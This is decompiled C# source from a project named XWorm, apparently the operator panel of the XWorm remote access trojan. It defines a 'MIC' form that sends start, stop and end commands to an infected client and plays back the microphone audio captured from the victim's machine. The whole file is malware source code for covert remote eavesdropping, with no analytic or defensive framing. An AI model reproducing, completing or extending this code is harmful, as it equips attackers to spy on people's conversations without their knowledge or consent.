using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000020 RID: 32
	[DesignerGenerated]
	public partial class MIC : Form
	{
		// Token: 0x0600067C RID: 1660 RVA: 0x0003A6BC File Offset: 0x000388BC
		public MIC()
		{
			base.Load += this.MIC_Load;
			base.FormClosing += this.MIC_FormClosing;
			this.waveplayer = new WaveOut();
			this.bwp = new BufferedWaveProvider(new WaveFormat(8000, 16, 1));
			this.InitializeComponent();
		}

		// Token: 0x17000269 RID: 617
		// (get) Token: 0x0600067F RID: 1663 RVA: 0x0003ADD8 File Offset: 0x00038FD8
		// (set) Token: 0x06000680 RID: 1664 RVA: 0x0003ADE2 File Offset: 0x00038FE2
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026A RID: 618
		// (get) Token: 0x06000681 RID: 1665 RVA: 0x0003ADEB File Offset: 0x00038FEB
		// (set) Token: 0x06000682 RID: 1666 RVA: 0x0003ADF8 File Offset: 0x00038FF8
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700026B RID: 619
		// (get) Token: 0x06000683 RID: 1667 RVA: 0x0003AE3B File Offset: 0x0003903B
		// (set) Token: 0x06000684 RID: 1668 RVA: 0x0003AE45 File Offset: 0x00039045
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026C RID: 620
		// (get) Token: 0x06000685 RID: 1669 RVA: 0x0003AE4E File Offset: 0x0003904E
		// (set) Token: 0x06000686 RID: 1670 RVA: 0x0003AE58 File Offset: 0x00039058
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026D RID: 621
		// (get) Token: 0x06000687 RID: 1671 RVA: 0x0003AE61 File Offset: 0x00039061
		// (set) Token: 0x06000688 RID: 1672 RVA: 0x0003AE6C File Offset: 0x0003906C
		internal virtual Guna2ComboBox Guna2ComboBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ComboBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2ComboBox1_SelectedIndexChanged);
				Guna2ComboBox guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged -= value2;
				}
				this._Guna2ComboBox1 = value;
				guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x1700026E RID: 622
		// (get) Token: 0x06000689 RID: 1673 RVA: 0x0003AEAF File Offset: 0x000390AF
		// (set) Token: 0x0600068A RID: 1674 RVA: 0x0003AEBC File Offset: 0x000390BC
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x1700026F RID: 623
		// (get) Token: 0x0600068B RID: 1675 RVA: 0x0003AEFF File Offset: 0x000390FF
		// (set) Token: 0x0600068C RID: 1676 RVA: 0x0003AF09 File Offset: 0x00039109
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600068D RID: 1677 RVA: 0x0003AF12 File Offset: 0x00039112
		private void MIC_Load(object sender, EventArgs e)
		{
			this.Guna2GradientButton1.PerformClick();
		}

		// Token: 0x0600068E RID: 1678 RVA: 0x0003AF24 File Offset: 0x00039124
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600068F RID: 1679 RVA: 0x0003AF7C File Offset: 0x0003917C
		private void MIC_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.waveplayer.Stop();
				WaveOut waveOut = this.waveplayer;
				if (waveOut != null)
				{
					waveOut.Dispose();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			byte[] state = Helper.SB("ENDMIC");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000690 RID: 1680 RVA: 0x0003B008 File Offset: 0x00039208
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Start", false) == 0;
				if (flag)
				{
					byte[] state = Helper.SB("MIC" + SettingsHelper.SPL + this.Guna2ComboBox1.SelectedIndex.ToString());
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
					this.Guna2GradientButton1.Text = "Stop";
					this.Guna2GradientButton1.Image = Resources._Stop;
					this.PictureBox1.Enabled = true;
				}
				else
				{
					byte[] state2 = Helper.SB("CLOSEMIC");
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
					this.Guna2GradientButton1.Text = "Start";
					this.Guna2GradientButton1.Image = Resources.Play;
					this.PictureBox1.Enabled = false;
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000691 RID: 1681 RVA: 0x0003B158 File Offset: 0x00039358
		private void Guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				byte[] state = Helper.SB("CLOSEMIC");
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.Guna2GradientButton1.Text = "Start";
				this.Guna2GradientButton1.Image = Resources.Play;
				this.PictureBox1.Enabled = false;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x040002AA RID: 682
		public Client C;

		// Token: 0x040002AB RID: 683
		public WaveOut waveplayer;

		// Token: 0x040002AC RID: 684
		public BufferedWaveProvider bwp;
	}
}
